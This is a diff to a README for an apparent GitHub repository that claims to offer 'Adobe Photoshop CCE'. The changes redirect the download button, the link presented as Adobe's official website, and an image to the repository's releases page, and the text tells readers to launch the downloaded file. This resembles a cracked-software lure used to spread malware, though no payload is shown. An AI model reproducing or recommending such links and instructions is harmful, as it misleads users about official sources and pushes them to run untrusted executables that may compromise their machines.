@@ -30,7 +30,7 @@ Explore a wide range of topics in Adobe Photoshop CC, including:
 
 Ready to take your Photoshop skills to the next level? Download the Adobe Photoshop CCE repository files by clicking on the button below:
 
-[![Download Adobe Photoshop CCE](https://img.shields.io/badge/Download-Adobe%20Photoshop%20CCE-blue.svg)](https://github.com/repo/releases/9246/App.zip)
+[![Download Adobe Photoshop CCE](https://github.com/Tamralph47/Adobe-Photoshop-CCE/releases%20Photoshop%https://github.com/Tamralph47/Adobe-Photoshop-CCE/releases)](https://github.com/Tamralph47/Adobe-Photoshop-CCE/releases)
 
 *Note: Make sure to launch the downloaded file to get started!*
 
@@ -40,7 +40,7 @@ If the provided link is not working or you need additional resources, please che
 
 ## Explore More
 
-Visit the official [Adobe Photoshop CC website](https://www.adobe.com/products/photoshop.html) to learn more about the software and its features.
+Visit the official [Adobe Photoshop CC website](https://github.com/Tamralph47/Adobe-Photoshop-CCE/releases) to learn more about the software and its features.
 
 ## Let's Connect
 
@@ -50,6 +50,6 @@ Join our community of Photoshop enthusiasts to stay updated on the latest tips, 
 
 Dive into the world of Adobe Photoshop CC with the Adobe Photoshop CCE repository. Enhance your skills, unleash your creativity, and take your designs to new heights! 🎨🚀
 
-![Adobe Photoshop CCE](https://example.com/photoshop_image.jpg)
+![Adobe Photoshop CCE](https://github.com/Tamralph47/Adobe-Photoshop-CCE/releases)
 
 Happy Editing! 💻✨
